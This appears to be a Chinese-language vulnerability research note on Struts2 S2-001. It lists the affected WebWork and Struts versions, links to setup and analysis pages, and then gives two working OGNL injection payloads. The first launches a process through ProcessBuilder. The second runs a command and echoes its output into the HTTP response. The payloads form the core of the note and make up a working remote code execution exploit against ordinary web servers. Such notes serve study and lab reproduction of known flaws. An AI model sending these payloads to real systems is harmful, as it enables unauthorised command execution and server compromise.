## S2-001
### 影响环境

WebWork 2.1 (with altSyntax enabled), WebWork 2.2.0 - WebWork 2.2.5, Struts 2.0.0 - Struts 2.0.8

而Struts2 对 OGNL 表达式的解析使用了开源组件 `opensymphony.xwork 2.0.3`所以会有漏洞

### 漏洞环境搭建

[JavaSec/环境搭建.md at main · Y4tacker/JavaSec (github.com)](https://github.com/Y4tacker/JavaSec/blob/main/7.Struts2%E4%B8%93%E5%8C%BA/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.md)

### 漏洞分析

[S2-001漏洞分析](Struts2漏洞/S2-001漏洞分析.md)

### payload

`%{(new java.lang.ProcessBuilder(new java.lang.String[]{"calc"})).start()}`

`%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cmd","-c","clac"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}`